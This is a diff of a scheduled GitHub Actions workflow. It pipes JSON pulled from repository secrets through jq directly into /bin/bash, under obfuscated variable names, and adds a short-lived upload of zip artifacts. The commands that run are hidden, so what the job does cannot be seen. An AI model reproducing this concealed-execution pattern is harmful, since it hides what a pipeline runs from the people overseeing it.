@@ -1,36 +1,27 @@
 name: zhuangtianbixing
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '12 2/6 * * *'
 
-jobs:  # 4733
+  schedule:
+    - cron: '11 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhuangtianbixing
         env:
-          vhz14: ${{ secrets.vhz14 }}
+          g9710: ${{ secrets.g9710 }}
         run: |
-          echo $vhz14 | jq -r .u062 | /bin/bash
-          echo $zpb37 | jq -r .wapj2588 | /bin/bash
-          echo $hvb8 | jq -r .p8670 | /bin/bash
-          echo $zrl8 | jq -r .kh67 | /bin/bash
-          echo $jeymz09 | jq -r .k9 | /bin/bash
-          echo $rao51551 | jq -r .k50 | /bin/bash
-          echo $rbf118 | jq -r .pop653 | /bin/bash
-          echo $rly695 | jq -r .mlz1843 | /bin/bash
-          echo $rbmh3 | jq -r .dy5508 | /bin/bash
-          echo $qxb7 | jq -r .xonop4288 | /bin/bash
-          echo $abu3 | jq -r .hc14739 | /bin/bash
-          echo $kvbns5 | jq -r .tcrfy47 | /bin/bash
-          echo $g44 | jq -r .eth91 | /bin/bash
-          echo $dheq10054 | jq -r .ih79 | /bin/bash
-          echo $zmfsb0256 | jq -r .prpdx345 | /bin/bash
-          echo $idhh4330 | jq -r .qfai71 | /bin/bash
-          echo $ageh82 | jq -r .tmwh5 | /bin/bash
-          echo $wu14 | jq -r .zoc040 | /bin/bash
-          echo $irsq177 | jq -r .uj92 | /bin/bash
+          printf '%s' "$g9710" | jq -r .w044 | /bin/bash
+          echo $r4368 | jq -r .kh19 | /bin/bash
+          echo $q33 | jq -r .ndwmb387 | /bin/bash
+          echo $tpz43445 | jq -r .fnt421 | /bin/bash
+          echo $zqip5178 | jq -r .pbx2916 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ihH56mwf
+          path: "*.zip"
+          retention-days: 1
